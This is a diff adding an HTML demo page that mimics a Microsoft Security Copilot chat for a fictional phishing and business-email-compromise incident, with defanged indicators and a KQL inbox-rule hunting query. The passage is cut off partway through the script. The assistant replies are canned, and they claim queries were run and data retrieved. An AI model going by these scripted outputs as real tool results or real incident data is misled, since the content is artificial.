@@ -1,0 +1,894 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Security Copilot – Demo</title>
+<style>
+:root{
+  --bg:#0e0e0f; --panel:#1b1b1d; --panel2:#232326; --line:#2e2e32;
+  --text:#ececec; --muted:#9a9aa2; --teal:#3fc9d1; --blue:#4aa3ff; --purple:#a77bff;
+  --red:#ff6b6b; --amber:#ffb454; --green:#4cd68b;
+}
+*{box-sizing:border-box}
+html,body{height:100%;margin:0}
+body{background:var(--bg);color:var(--text);font-family:"Segoe UI Variable","Segoe UI",system-ui,-apple-system,Roboto,sans-serif;overflow:hidden}
+button{font:inherit;color:inherit;cursor:pointer}
+
+/* top bar */
+.topbar{position:fixed;top:0;left:0;right:0;height:46px;display:flex;align-items:center;gap:4px;padding:0 14px;background:#0a0a0b;border-bottom:1px solid #1b1b1d;z-index:20}
+.topbar .sq{width:15px;height:15px;border:1.5px solid #cfcfd4;border-radius:2px;margin-right:18px}
+.ib{background:none;border:0;width:32px;height:32px;border-radius:6px;display:grid;place-items:center;color:#8a8a92}
+.ib:hover{background:#1f1f22;color:#fff}
+.ib svg{width:17px;height:17px;stroke:currentColor;fill:none;stroke-width:1.7;stroke-linecap:round;stroke-linejoin:round}
+.spacer{flex:1}
+
+/* landing */
+.landing{position:absolute;inset:46px 0 0 0;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;
+  background:
+   radial-gradient(900px 500px at 95% 100%, rgba(22,120,125,.38), transparent 60%),
+   repeating-linear-gradient(115deg, rgba(255,255,255,.012) 0 2px, transparent 2px 40px), var(--bg)}
+.logo{width:92px;height:104px;margin-bottom:26px;filter:drop-shadow(0 10px 30px rgba(60,140,255,.25))}
+.landing h1{font-size:40px;font-weight:600;margin:0 0 46px;letter-spacing:.2px}
+.composer{width:min(720px,92vw);background:#0b0b0c;border:1.5px solid #2f3b40;border-radius:12px;padding:0;position:relative;box-shadow:0 0 0 1px #000, 0 12px 40px rgba(0,0,0,.5)}
+.composer::after{content:"";position:absolute;left:10px;right:10px;bottom:-1.5px;height:3px;border-radius:3px;background:linear-gradient(90deg,transparent,#2fb8c4 30%,#2fb8c4 70%,transparent)}
+.composer .row{display:flex;align-items:center;gap:12px;padding:20px 18px}
+.composer input{flex:1;background:none;border:0;outline:0;color:var(--text);font-size:18px;caret-color:var(--teal)}
+.composer input::placeholder{color:#8f9aa0}
+.spark{width:20px;height:20px;stroke:var(--teal);fill:none;stroke-width:1.5;flex:none}
+.send{background:none;border:0;color:#6b6b73;width:34px;height:34px;display:grid;place-items:center;border-radius:6px}
+.send:hover,.send.ready{color:var(--teal)}
+.send svg{width:20px;height:20px;stroke:currentColor;fill:none;stroke-width:1.5;stroke-linejoin:round}
+.suggest{display:flex;flex-wrap:wrap;gap:10px;justify-content:center;margin-top:20px;max-width:820px}
+.scen{display:flex;gap:12px;flex-wrap:wrap;justify-content:center;margin-top:30px}
+.sc{width:300px;text-align:left;background:rgba(255,255,255,.04);border:1px solid #34343a;border-radius:12px;padding:12px 14px;transition:.15s}
+.sc b{display:block;font-size:14px;margin-bottom:4px}.sc span{font-size:12px;color:#9aa4aa;line-height:1.4}
+.sc:hover{border-color:#4a8f96}.sc.on{border-color:var(--teal);background:rgba(63,201,209,.09)}
+.pill{margin-left:14px;font-size:12.5px;color:#bfe9ee;border:1px solid #2c3a3f;background:#101719;border-radius:999px;padding:4px 12px}
+.pill:hover{border-color:var(--teal)}
+.chip{background:rgba(255,255,255,.04);border:1px solid #34343a;border-radius:999px;padding:8px 14px;font-size:13px;color:#c9c9cf;transition:.15s}
+.chip:hover{border-color:var(--teal);color:#fff;background:rgba(63,201,209,.08)}
+.hint{margin-top:18px;color:#6e6e76;font-size:12px}
+
+/* chat */
+.chat{position:absolute;inset:46px 0 0 0;display:none;flex-direction:column;background:#101012}
+body.chatting .landing{display:none}
+body.chatting .chat{display:flex}
+.scroll{flex:1;overflow-y:auto;padding:26px 0 30px;scroll-behavior:smooth}
+.col{width:min(780px,92vw);margin:0 auto}
+.scroll::-webkit-scrollbar{width:8px}.scroll::-webkit-scrollbar-thumb{background:#2a2a2e;border-radius:8px}
+.turn{margin-bottom:22px}
+.user{background:#1f2124;border:1px solid #2b2d31;border-radius:12px;padding:13px 16px;font-size:15px;line-height:1.55;margin-left:auto;max-width:88%;width:fit-content}
+.who{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--muted);margin:0 0 6px}
+.who.me{justify-content:flex-end}
+.avatar{width:20px;height:20px}
+.reply{background:var(--panel);border:1px solid #28282c;border-radius:12px;padding:18px 22px;margin-top:14px;font-size:15px;line-height:1.75}
+.reply p{margin:0 0 12px}
+.reply h4{margin:14px 0 8px;font-size:15px;color:#fff}
+.reply ol,.reply ul{margin:0 0 12px;padding-left:22px}
+.reply li{margin:0 0 9px}
+.reply b{color:#fff;font-weight:600}
+.reply code.i{background:#2a2a2f;border-radius:4px;padding:1px 6px;font-size:13px;color:#9bdcf0;font-family:Consolas,"Cascadia Mono",monospace}
+.reply a{color:var(--blue)}
+.tag{display:inline-block;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:600;margin-right:2px}
+.t-red{background:rgba(255,107,107,.15);color:var(--red)}
+.t-amb{background:rgba(255,180,84,.15);color:var(--amber)}
+.t-grn{background:rgba(76,214,139,.14);color:var(--green)}
+.t-blu{background:rgba(74,163,255,.15);color:var(--blue)}
+.w{opacity:0;transition:opacity .12s}.w.on{opacity:1}
+.fade{opacity:0;transform:translateY(6px);transition:.35s}.fade.on{opacity:1;transform:none}
+
+/* thinking steps */
+.steps{background:var(--panel);border:1px solid #28282c;border-radius:12px;padding:14px 18px;margin-top:14px;font-size:13.5px;color:#bdbdc5}
+.step{display:flex;align-items:center;gap:10px;padding:4px 0;opacity:.35;transition:.25s}
+.step.run,.step.done{opacity:1}
+.dot{width:14px;height:14px;border-radius:50%;border:2px solid #4a4a50;flex:none;position:relative}
+.step.run .dot{border-color:var(--teal);border-right-color:transparent;animation:spin .8s linear infinite}
+.step.done .dot{border-color:var(--green);background:var(--green)}
+.step.done .dot::after{content:"";position:absolute;left:3px;top:0px;width:3px;height:7px;border:solid #07130b;border-width:0 2px 2px 0;transform:rotate(45deg)}
+@keyframes spin{to{transform:rotate(360deg)}}
+.plug{font-size:11px;border:1px solid #3a3a40;border-radius:4px;padding:1px 6px;color:#8fd4dc;margin-left:auto}
+
+/* tables */
+.tw{overflow-x:auto;margin:6px 0 14px;border:1px solid #2e2e33;border-radius:8px}
+table{border-collapse:collapse;width:100%;font-size:13.5px;line-height:1.45}
+th{background:#26262a;text-align:left;padding:9px 12px;font-weight:600;color:#d8d8de;white-space:nowrap}
+td{padding:9px 12px;border-top:1px solid #2c2c31;vertical-align:top}
+tr.hl td{background:rgba(255,107,107,.07)}
+pre{background:#0c0c0e;border:1px solid #2c2c31;border-radius:8px;margin:6px 0 14px;padding:14px 16px;overflow-x:auto;font-size:13px;line-height:1.6;font-family:Consolas,"Cascadia Mono",monospace;color:#d6e4ee}
+.kw{color:#6ab7ff}.fn{color:#d7a8ff}.st{color:#f0a674}.cm{color:#6f8a6f}
+.codehead{display:flex;justify-content:space-between;align-items:center;font-size:12px;color:var(--muted);margin-top:4px}
+.mini{background:#26262a;border:1px solid #38383e;border-radius:6px;padding:3px 10px;font-size:12px;color:#cfcfd6}
+.mini:hover{border-color:var(--teal);color:#fff}
+
+/* actions */
+.act{display:flex;align-items:center;gap:12px;background:#202024;border:1px solid #303036;border-radius:10px;padding:10px 14px;margin:0 0 9px;font-size:14px}
+.act .tx{flex:1}
+.act small{display:block;color:var(--muted);font-size:12px;margin-top:2px}
+.run{background:#0f6cbd;border:0;border-radius:6px;padding:6px 14px;font-size:13px;font-weight:600;color:#fff}
+.run:hover{background:#1a7ad0}
+.run.ok{background:#1e3d2b;color:var(--green);cursor:default}
+.run.busy{background:#2a2a2f;color:#aaa;cursor:default}
+
+/* reply footer */
+.rfoot{display:flex;align-items:center;gap:6px;margin-top:10px;padding-top:12px;border-top:1px solid #2a2a2e;font-size:12px;color:#7e7e86;flex-wrap:wrap}
+.rfoot .ib{width:28px;height:28px}
+.rfoot .src{margin-left:auto}
+.follow{display:flex;flex-wrap:wrap;gap:8px;margin-top:12px}
+
+/* bottom composer */
+.dock{padding:14px 0 10px;background:linear-gradient(180deg,transparent,#101012 30%)}
+.dock .composer{width:min(780px,92vw);margin:0 auto}
+.dock .row{padding:14px 16px}
+.dock input{font-size:15px}
+.dock .ico{display:flex;gap:2px;align-items:center}
+.dock .ico .ib{width:30px;height:30px;color:#a3a3ab}
+.dock .sepv{width:1px;height:22px;background:#33333a;margin:0 6px}
+.disc{text-align:center;font-size:12px;color:#8a8a92;margin-top:10px}
+
+/* help fab + drawers + modals */
+.fab{position:fixed;right:22px;bottom:20px;width:36px;height:36px;border-radius:50%;background:#101012;border:1px solid #3a3a40;color:#ddd;z-index:30;font-size:17px;display:grid;place-items:center;box-shadow:0 4px 14px rgba(0,0,0,.5)}
+.fab:hover{border-color:var(--teal)}
+.drawer{position:fixed;top:46px;right:0;bottom:0;width:380px;max-width:94vw;background:#141416;border-left:1px solid #2a2a2e;z-index:25;transform:translateX(100%);transition:.28s;display:flex;flex-direction:column}
+.drawer.open{transform:none}
+.drawer header{padding:16px 18px;border-bottom:1px solid #26262a}
+.drawer header h3{margin:0 0 4px;font-size:16px}
+.drawer header p{margin:0;font-size:12.5px;color:var(--muted);line-height:1.5}
+.drawer .body{overflow-y:auto;padding:12px 14px 80px;flex:1}
+.demo{display:block;width:100%;text-align:left;background:#1c1c1f;border:1px solid #2c2c31;border-radius:10px;padding:11px 13px;margin-bottom:10px}
+.demo:hover{border-color:var(--teal)}
+.demo .n{display:inline-grid;place-items:center;width:20px;height:20px;border-radius:50%;background:#0f6cbd;font-size:11px;font-weight:700;margin-right:8px}
+.demo b{font-size:13.5px}
+.demo em{display:block;font-style:normal;font-size:12px;color:#aab;margin-top:6px;line-height:1.5}
+.demo q{display:block;font-size:12.5px;color:#8fd4dc;margin-top:6px;quotes:none}
+.modal{position:fixed;inset:0;background:rgba(0,0,0,.65);display:none;place-items:center;z-index:40;padding:20px}
+.modal.open{display:grid}
+.mbox{background:#15161a;border:1px solid #2e2f35;border-radius:14px;width:min(900px,96vw);max-height:90vh;overflow:auto;padding:22px 26px}
+.mbox h2{margin:0 0 4px;font-size:20px}
+.mbox .sub{color:var(--muted);font-size:13px;margin-bottom:16px}
+.xclose{float:right}
+.plugrow{display:flex;align-items:center;gap:12px;padding:12px 0;border-top:1px solid #26262b;font-size:14px}
+.plugrow:first-of-type{border-top:0}
+.pi{width:30px;height:30px;border-radius:8px;display:grid;place-items:center;font-weight:700;font-size:12px;color:#fff;flex:none}
+.sw{margin-left:auto;width:38px;height:20px;border-radius:20px;background:#0f6cbd;position:relative}
+.sw::after{content:"";position:absolute;right:3px;top:3px;width:14px;height:14px;border-radius:50%;background:#fff}
+.flow{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:6px}
+.flow div{background:#1c1d22;border:1px solid #2d2e34;border-radius:10px;padding:10px 12px;font-size:13.5px;line-height:1.45}
+.flow b{display:inline-grid;place-items:center;width:22px;height:22px;border-radius:50%;background:linear-gradient(135deg,#4aa3ff,#a77bff);font-size:12px;margin-right:8px}
+.tb{border:1.5px dashed #5a8fb5;border-radius:14px;padding:16px;margin:14px 0;position:relative}
+.tb .lab{position:absolute;top:-11px;left:18px;background:#15161a;padding:0 10px;font-size:12px;color:#7fd3de;font-weight:600}
+.tb .line{display:flex;align-items:center;justify-content:space-between;gap:8px;flex-wrap:wrap;font-size:13px}
+.node{background:#1f2026;border:1px solid #34353c;border-radius:10px;padding:10px 14px;text-align:center;min-width:120px}
+.arrow{color:var(--teal);font-size:18px}
+.toast{position:fixed;bottom:90px;left:50%;transform:translateX(-50%) translateY(20px);background:#1d2b22;border:1px solid #2e5a40;color:#bff0d3;padding:10px 18px;border-radius:10px;font-size:13.5px;opacity:0;pointer-events:none;transition:.3s;z-index:60}
+.toast.show{opacity:1;transform:translateX(-50%)}
+@media(max-width:640px){.landing h1{font-size:30px}.flow{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+
+<!-- top bar (matches the Security Copilot embedded toolbar) -->
+<div class="topbar">
+  <div class="sq"></div>
+  <button class="ib" title="Pin"><svg viewBox="0 0 24 24"><path d="M12 17v5M9 3h6l-1 6 3 3v2H7v-2l3-3z"/></svg></button>
+  <button class="ib" title="Restart demo" onclick="resetDemo()"><svg viewBox="0 0 24 24"><path d="M21 12a9 9 0 1 1-3-6.7L21 8M21 3v5h-5"/></svg></button>
+  <button class="ib" title="Clear session" onclick="resetDemo()"><svg viewBox="0 0 24 24"><path d="M4 7h16M10 11v6M14 11v6M6 7l1 13h10l1-13M9 7V4h6v3"/></svg></button>
+  <button class="ib" title="Promptbooks" onclick="openDrawer()"><svg viewBox="0 0 24 24"><rect x="4" y="3" width="16" height="18" rx="2"/><path d="M9 8h6M9 12h6M9 16h3"/></svg></button>
+  <button class="pill" id="pill" onclick="resetDemo()" title="Back to incident selection"></button>
+  <div class="spacer"></div>
+  <button class="ib" title="Data flow &amp; trust boundary" onclick="openModal('flowModal')"><svg viewBox="0 0 24 24"><path d="M3 12h18M7 8l-4 4 4 4M17 8l4 4-4 4"/></svg></button>
+  <button class="ib" title="Sources" onclick="openModal('plugModal')"><svg viewBox="0 0 24 24"><rect x="4" y="4" width="16" height="16" rx="2"/><path d="M14 4v16"/></svg></button>
+</div>
+
+<!-- landing -->
+<section class="landing" id="landing">
+  <svg class="logo" viewBox="0 0 64 72" aria-hidden="true">
+    <defs>
+      <linearGradient id="g1" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#5ad2ff"/><stop offset="1" stop-color="#2d7bff"/></linearGradient>
+      <linearGradient id="g2" x1="1" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#3b8dff"/><stop offset="1" stop-color="#1f3fb8"/></linearGradient>
+    </defs>
+    <path d="M28 5C36 -1 54 2 54 16v10c0 7-6 11-11 14L24 52c-6 4-16 1-16-8V32c0-8 6-12 11-15z" fill="url(#g1)"/>
+    <path d="M36 67C28 73 10 70 10 56V46c0-7 6-11 11-14l19-12c6-4 16-1 16 8v12c0 8-6 12-11 15z" fill="url(#g2)" opacity=".95"/>
+  </svg>
+  <h1>Security Copilot</h1>
+  <div class="composer">
+    <div class="row">
+      <svg class="spark" viewBox="0 0 24 24"><path d="M9 3l1.6 4.4L15 9l-4.4 1.6L9 15l-1.6-4.4L3 9l4.4-1.6zM17 12l1 2.6 2.6 1-2.6 1-1 2.6-1-2.6-2.6-1 2.6-1z"/></svg>
+      <input id="in1" placeholder="Ask anything about security" autocomplete="off" autofocus>
+      <button class="send" id="s1" title="Send"><svg viewBox="0 0 24 24"><path d="M3 11l18-8-8 18-2-8z"/></svg></button>
+    </div>
+  </div>
+  <div class="scen">
+    <button class="sc on" data-s="phish"><b>📧 Phishing incident</b><span>#4721 · AiTM phishing → stolen session → BEC</span></button>
+    <button class="sc" data-s="ransom"><b>🔒 Ransomware threat</b><span>#5188 · Malicious macro → encryption attempt on a device</span></button>
+  </div>
+  <div class="suggest" id="chips"></div>
+  <div class="hint">Pick an incident, then type your own prompt or press “?” for the guided demo script.</div>
+</section>
+
+<!-- chat -->
+<section class="chat" id="chat">
+  <div class="scroll" id="scroll"><div class="col" id="thread"></div></div>
+  <div class="dock">
+    <div class="composer">
+      <div class="row">
+        <input id="in2" placeholder="How can Copilot for Security help?" autocomplete="off">
+        <div class="ico">
+          <button class="ib" title="Prompts"><svg viewBox="0 0 24 24"><path d="M9 3l1.6 4.4L15 9l-4.4 1.6L9 15l-1.6-4.4L3 9l4.4-1.6zM17 12l1 2.6 2.6 1-2.6 1-1 2.6-1-2.6-2.6-1 2.6-1z"/></svg></button>
+          <button class="ib" title="Sources" onclick="openModal('plugModal')"><svg viewBox="0 0 24 24"><rect x="4" y="4" width="7" height="7" rx="1"/><rect x="13" y="4" width="7" height="7" rx="1"/><rect x="4" y="13" width="7" height="7" rx="1"/><rect x="13" y="13" width="7" height="7" rx="1"/></svg></button>
+          <span class="sepv"></span>
+          <button class="send" id="s2" title="Send"><svg viewBox="0 0 24 24"><path d="M3 11l18-8-8 18-2-8z"/></svg></button>
+        </div>
+      </div>
+    </div>
+    <div class="disc">AI-generated content may be incorrect. Check it for accuracy. &nbsp;·&nbsp; <span style="color:#6d6d75">Simulated demo – fictional tenant &amp; data</span></div>
+  </div>
+</section>
+
+<button class="fab" title="Demo guide" onclick="openDrawer()">?</button>
+
+<!-- demo guide -->
+<aside class="drawer" id="drawer">
+  <header>
+    <button class="ib xclose" onclick="closeDrawer()" title="Close" style="float:right"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+    <h3 id="gtitle">Demo guide</h3>
+    <p id="gdesc"></p>
+  </header>
+  <div class="body" id="guide"></div>
+</aside>
+
+<!-- modals -->
+<div class="modal" id="plugModal" onclick="if(event.target===this)closeModal('plugModal')">
+  <div class="mbox">
+    <button class="ib xclose" onclick="closeModal('plugModal')"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+    <h2>Sources</h2><div class="sub">Plugins Copilot can use to ground its answers in your environment.</div>
+    <div class="plugrow"><div class="pi" style="background:#0f6cbd">XDR</div><div><b>Microsoft Defender XDR</b><br><span style="color:var(--muted);font-size:12.5px">Incidents, alerts, advanced hunting</span></div><div class="sw"></div></div>
+    <div class="plugrow"><div class="pi" style="background:#5c2d91">SEN</div><div><b>Microsoft Sentinel</b><br><span style="color:var(--muted);font-size:12.5px">SIEM incidents &amp; KQL</span></div><div class="sw"></div></div>
+    <div class="plugrow"><div class="pi" style="background:#0a7d8c">ID</div><div><b>Microsoft Entra</b><br><span style="color:var(--muted);font-size:12.5px">Sign-ins, risky users, conditional access</span></div><div class="sw"></div></div>
+    <div class="plugrow"><div class="pi" style="background:#107c10">INT</div><div><b>Microsoft Intune</b><br><span style="color:var(--muted);font-size:12.5px">Device compliance &amp; configuration</span></div><div class="sw"></div></div>
+    <div class="plugrow"><div class="pi" style="background:#8a3ffc">PUR</div><div><b>Microsoft Purview</b><br><span style="color:var(--muted);font-size:12.5px">DLP, Insider Risk, eDiscovery</span></div><div class="sw"></div></div>
+    <div class="plugrow"><div class="pi" style="background:#c43e1c">MTI</div><div><b>Defender Threat Intelligence</b><br><span style="color:var(--muted);font-size:12.5px">Actors, IOCs, reputation</span></div><div class="sw"></div></div>
+  </div>
+</div>
+
+<div class="modal" id="flowModal" onclick="if(event.target===this)closeModal('flowModal')">
+  <div class="mbox">
+    <button class="ib xclose" onclick="closeModal('flowModal')"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+    <h2>Data flow for Security Copilot</h2><div class="sub">Everything stays inside the Microsoft Security trust boundary. All requests are encrypted over HTTPS.</div>
+    <div class="tb"><span class="lab">Microsoft Security trust boundary</span>
+      <div class="line">
+        <div class="node">Prompt from<br>Defender XDR · Sentinel · Intune</div><span class="arrow">➜</span>
+        <div class="node" style="border-color:#4aa3ff"><b>Security Copilot</b><br>pre / post-processing</div><span class="arrow">⇄</span>
+        <div class="node">Responsible AI checks<br>+ Azure OpenAI (LLM)</div>
+      </div>
+      <div class="line" style="margin-top:12px"><div class="node" style="flex:1">Plugins: Microsoft &amp; third-party security products – grounding with your logs, alerts, incidents &amp; policies</div></div>
+    </div>
+    <div class="flow">
+      <div><b>1</b>User prompts from security products are sent to Copilot</div>
+      <div><b>2</b>Copilot accesses plugins for pre-processing (grounding)</div>
+      <div><b>3</b>Copilot sends the modified prompt to the LLM</div>
+      <div><b>4</b>Copilot receives the LLM response</div>
+      <div><b>5</b>Copilot accesses plugins for post-processing</div>
+      <div><b>6</b>Copilot sends the response and app commands back to the security products</div>
+    </div>
+    <p style="font-size:13px;color:#b9b9c2;margin:16px 0 0;line-height:1.6">Customer data is not stored outside the compliance boundary or used to train foundation models. The Azure OpenAI instance is maintained by Microsoft; OpenAI has no access to the data or the model.</p>
+  </div>
+</div>
+<div class="toast" id="toast"></div>
+
+<script>
+/* ---------- helpers ---------- */
+const $=s=>document.querySelector(s);
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+const thread=$('#thread'), scroller=$('#scroll');
+let busy=false;
+const toBottom=()=>{scroller.scrollTop=scroller.scrollHeight};
+function toast(t){const e=$('#toast');e.textContent=t;e.classList.add('show');setTimeout(()=>e.classList.remove('show'),2600)}
+function openDrawer(){$('#drawer').classList.add('open')} function closeDrawer(){$('#drawer').classList.remove('open')}
+function openModal(id){document.getElementById(id).classList.add('open')} function closeModal(id){document.getElementById(id).classList.remove('open')}
+const esc=s=>s.replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
+const R='<span class="tag t-red">',A='<span class="tag t-amb">',G='<span class="tag t-grn">',B='<span class="tag t-blu">',X='</span>';
+const AV='<svg class="avatar" viewBox="0 0 64 72"><path d="M28 5C36 -1 54 2 54 16v10c0 7-6 11-11 14L24 52c-6 4-16 1-16-8V32c0-8 6-12 11-15z" fill="#4aa3ff"/><path d="M36 67C28 73 10 70 10 56V46c0-7 6-11 11-14l19-12c6-4 16-1 16 8v12c0 8-6 12-11 15z" fill="#2a56d6"/></svg>';
+
+/* ---------- scenario content ---------- */
+const FOLLOW_P={
+ summary:["What is the blast radius of this incident?","Show sign-in activity for thandi.mokoena@contoso.co.za"],
+ blast:["Show sign-in activity for thandi.mokoena@contoso.co.za","Is her laptop compromised? Check Intune"],
+ signin:["Write a KQL query to find inbox rules created by this user","Map this incident to MITRE ATT&CK"],
+ kql:["Is her laptop compromised? Check Intune","Recommend remediation steps"],
+ device:["Map this incident to MITRE ATT&CK","Recommend remediation steps"],
+ mitre:["Recommend remediation steps"],
+ remed:["Give me an executive summary I can send to the CISO"],
+ exec:["Summarize incident 4721"],
+ help:["Summarize incident 4721","What is the blast radius of this incident?"],
+ fall:["Summarize incident 4721","Recommend remediation steps"]
+};
+
+const KB_P={
+summary:{
+ steps:[["Understanding your prompt",""],["Retrieving incident 4721","Defender XDR"],["Correlating 14 alerts across 4 sources","Defender XDR"],["Enriching with Entra ID Protection risk","Entra"],["Generating summary",""]],
+ blocks:[
+  {t:'p',h:`Incident <b>#4721</b> – <i>Multi-stage incident involving Initial access &amp; Defense evasion</i> – is ${R}High${X} severity and ${A}Active${X}. It was created today at <b>09:14 SAST</b>. Defender XDR correlated <b>14 alerts from 4 sources</b> into a single attack story: a <b>business email compromise (BEC)</b> that began with an adversary-in-the-middle (AiTM) phishing page.`},
+  {t:'table',head:['Field','Value'],rows:[
+    ['Severity / status','High / Active (unassigned)'],
+    ['Impacted account','thandi.mokoena@contoso.co.za (Finance, Accounts Payable)'],
+    ['Impacted device','FIN-LT-0342 (Windows 11)'],
+    ['Detection sources','Defender for Office 365 · Defender for Cloud Apps · Entra ID Protection · Defender for Endpoint'],
+    ['Attack type','Phishing → AiTM session-token theft → mailbox rule → data access']]},
+  {t:'h',h:'Attack story'},
+  {t:'ol',items:[
+   `<b>08:52</b> – Thandi receives an email “<code class="i">Remittance advice – Invoice 88213</code>” from <code class="i">billing@vendor-payments[.]co</code> (look-alike of a known supplier). Defender for Office 365 delivered it as <i>Phish – not detected at delivery</i>.`,
+   `<b>08:55</b> – She clicks the link to <code class="i">hxxps://contoso-sharepoint-docs[.]com/login</code>, a reverse-proxy page that relays her real Microsoft sign-in and MFA.`,
+   `<b>09:02</b> – A <b>stolen session token</b> is replayed from <code class="i">185.220.101.47</code> (Bucharest, RO, anonymising proxy). Entra flags ${R}Anonymous IP${X} and <i>Anomalous token</i>.`,
+   `<b>09:11</b> – The attacker creates an <b>inbox rule</b> that forwards mail containing “invoice / payment / bank” to an external address and hides it in <i>RSS Subscriptions</i>.`,
+   `<b>09:13</b> – Defender for Cloud Apps sees mass <code class="i">MailItemsAccessed</code> (112 items) and 23 files downloaded from the <i>Finance-Payments</i> SharePoint site.`]},
+  {t:'p',h:`<b>Confidence: High.</b> This is an identity-based compromise with likely intent to redirect supplier payments. I recommend scoping the blast radius next.`}
+ ]},
+
+blast:{
+ steps:[["Understanding your prompt",""],["Finding recipients of the phishing email","Defender XDR"],["Checking URL clicks &amp; sign-in risk","Defender XDR · Entra"],["Reviewing mailbox &amp; SharePoint access","Defender for Cloud Apps"],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`The phishing campaign reached <b>37 recipients</b> in Contoso. <b>3 users clicked</b> the link; <b>1 account is confirmed compromised</b>.`},
+  {t:'table',head:['User','Role','Clicked','Risky sign-in','Status'],hl:[0],rows:[
+    ['thandi.mokoena','Accounts Payable',`Yes`,`${R}High${X} – token replay`,`${R}Compromised${X}`],
+    ['pieter.vanwyk','Finance Manager','Yes',`${A}Low${X} – no anomalies`,`${A}Monitor${X}`],
+    ['lerato.dlamini','Procurement','Yes (blocked)',`${G}None${X}`,`${G}Safe Links blocked${X}`]]},
+  {t:'h',h:'Data exposed'},
+  {t:'ul',items:[
+   `<b>Mailbox:</b> 112 items accessed in 14 minutes – 9 contain bank-detail change requests from suppliers.`,
+   `<b>SharePoint:</b> 23 files downloaded from <i>Finance-Payments</i> (supplier master list, remittance templates).`,
+   `<b>External forwarding:</b> inbox rule forwarding to <code class="i">accounts.payable.contoso@proton[.]me</code> – <b>4 messages already forwarded</b>.`,
+   `<b>Devices:</b> only FIN-LT-0342 is associated with the user; no lateral movement observed.`]},
+  {t:'p',h:`${A}Priority${X} Pieter van Wyk clicked the same link – his session should be revoked as a precaution while we validate. Want me to look at Thandi's sign-ins?`}
+ ]},
+
+signin:{
+ steps:[["Understanding your prompt",""],["Resolving user thandi.mokoena@contoso.co.za","Entra"],["Retrieving sign-in logs (last 24h)","Entra"],["Evaluating risk detections &amp; token claims","Entra ID Protection"],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`Here is the sign-in activity for <b>thandi.mokoena@contoso.co.za</b> over the last 24 hours. The pattern is classic <b>session-token replay</b>:`},
+  {t:'table',head:['Time (SAST)','IP address','Location','App','Result','Risk'],hl:[1,2,3],rows:[
+   ['08:41','41.76.108.22','Johannesburg, ZA','Outlook (Windows)','Success – MFA',`${G}None${X}`],
+   ['08:55','104.21.67.9','Cloudflare proxy (AiTM)','Office 365 Exchange Online','Success – MFA',`${A}Medium${X}`],
+   ['09:02','185.220.101.47','Bucharest, RO','Office 365 Exchange Online','Success – <i>MFA claim in token</i>',`${R}High${X}`],
+   ['09:09','185.220.101.47','Bucharest, RO','Microsoft Graph','Success – <i>no MFA prompt</i>',`${R}High${X}`],
+   ['09:15','185.220.101.47','Bucharest, RO','SharePoint Online','Success – <i>no MFA prompt</i>',`${R}High${X}`]]},
+  {t:'h',h:'What stands out'},
+  {t:'ol',items:[
+   `<b>Impossible travel:</b> Johannesburg at 08:41, Bucharest at 09:02 – 21 minutes apart.`,
+   `<b>MFA satisfied without a prompt:</b> the attacker's sessions carry an MFA claim that originated at 08:55 from the phishing proxy – the user completed MFA, but on the attacker's relay.`,
+   `<b>Anonymous IP:</b> 185.220.101.47 is a known anonymising exit node (Defender Threat Intelligence reputation: ${R}Malicious${X}).`,
+   `<b>Entra ID Protection</b> has set the user's risk level to ${R}High${X} (detections: <i>Anomalous token</i>, <i>Anonymous IP</i>, <i>Attacker in the middle</i>).`]},
+  {t:'p',h:`Next I can write a hunting query to find any inbox rules the attacker created.`}
+ ]},
+
+kql:{
+ steps:[["Understanding your prompt",""],["Selecting table: CloudAppEvents","Defender XDR"],["Generating KQL (NL to KQL)",""],["Running query in Advanced Hunting","Defender XDR"],["Generating response",""]],
+ blocks:[
+  {t:'p',h:`I generated a KQL query for <b>Advanced Hunting</b> and ran it against the last 24 hours:`},
+  {t:'code',h:`<span class="cm">// Inbox rules created or modified by the compromised user</span>
+<span class="kw">CloudAppEvents</span>
+| <span class="kw">where</span> Timestamp &gt; <span class="fn">ago</span>(<span class="st">24h</span>)
+| <span class="kw">where</span> ActionType <span class="kw">in</span> (<span class="st">"New-InboxRule"</span>, <span class="st">"Set-InboxRule"</span>)
+| <span class="kw">where</span> AccountDisplayName <span class="kw">has</span> <span class="st">"Mokoena"</span>
+| <span class="kw">extend</span> RuleName = <span class="fn">tostring</span>(RawEventData.Parameters[<span class="st">0</span>].Value)
+| <span class="kw">extend</span> ForwardTo = <span class="fn">tostring</span>(<span class="fn">parse_json</span>(<span class="fn">tostring</span>(RawEventData.Parameters)))
+| <span class="kw">project</span> Timestamp, AccountDisplayName, ActionType, RuleName, IPAddress, CountryCode, ForwardTo
+| <span class="kw">order by</span> Timestamp <span class="kw">asc</span>`,raw:`CloudAppEvents
+| where Timestamp > ago(24h)
+| where ActionType in ("New-InboxRule", "Set-InboxRule")
+| where AccountDisplayName has "Mokoena"
+| extend RuleName = tostring(RawEventData.Parameters[0].Value)
+| project Timestamp, AccountDisplayName, ActionType, RuleName, IPAddress, CountryCode
+| order by Timestamp asc`},
+  {t:'p',h:`<b>1 result</b> – the attacker's rule:`},
+  {t:'table',head:['Timestamp','Action','Rule name','IP','Country'],hl:[0],rows:[
+   ['09:11:42','New-InboxRule','“.” (single dot)','185.220.101.47','RO']]},
+  {t:'ul',items:[
+   `<b>Conditions:</b> subject or body contains <i>invoice, payment, bank, remittance</i>.`,
+   `<b>Actions:</b> forward to <code class="i">accounts.payable.contoso@proton[.]me</code>, mark as read, move to <i>RSS Subscriptions</i>.`,
+   `A rule named with a single character is a well-known <b>defense-evasion</b> trick – it is easy to overlook in Outlook.`]}
+ ]},
+
+device:{
